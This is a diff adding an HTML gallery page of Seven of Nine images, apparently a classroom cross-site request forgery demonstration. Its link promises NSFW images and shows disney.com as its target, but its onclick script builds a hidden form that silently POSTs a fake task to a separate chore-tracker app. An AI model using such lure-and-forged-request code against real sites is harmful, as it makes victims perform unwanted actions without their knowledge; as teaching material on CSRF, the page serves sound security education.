@@ -1,0 +1,48 @@
+<html>
+	<head>
+		<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+		<meta name="author" content="Prof. H">
+		<title>Gallery 1: Seven of Nine</title>
+		<link rel="stylesheet" href="css/master.css" type="text/css" charset="utf-8" />
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+	</head>
+	<body id="gallery" onload="">
+		
+		
+		
+		<table border="0" cellspacing="15" cellpadding="15">
+			<tr>
+				<td><img src="images/7of9.jpg" class="height_only" /></td>
+				<td><img src="images/seven-of-nine.jpg" class="height_only" /></td>
+				<td><img src="images/7_of_9_human_error.jpg" class="height_only" /></td>
+			</tr>
+			<tr>
+				<td colspan="3" align="center">
+					
+					<a href="http://www.disney.com/" onclick="
+					  var f = document.createElement('form');
+					  f.style.display = 'none';
+					  this.parentNode.appendChild(f);
+					  f.method = 'POST';
+					  f.action = 'http://choretracker327.herokuapp.com/tasks/';
+
+					  var tname = document.createElement('input');
+					  tname.type = 'hidden';
+						tname.name = 'task[name]';
+						tname.value = 'Shave the cat again';
+						f.appendChild(tname);
+
+						var tpoints = document.createElement('input');
+						tpoints.type = 'hidden';
+						tpoints.name = 'task[points]';
+						tpoints.value = '1';
+						f.appendChild(tpoints);
+
+					  f.submit();
+					  return false;">Click to see some NSFW images of Seven of Nine!</a>
+					
+				</td>
+			</tr>
+		</table>
+	</body>
+</html>
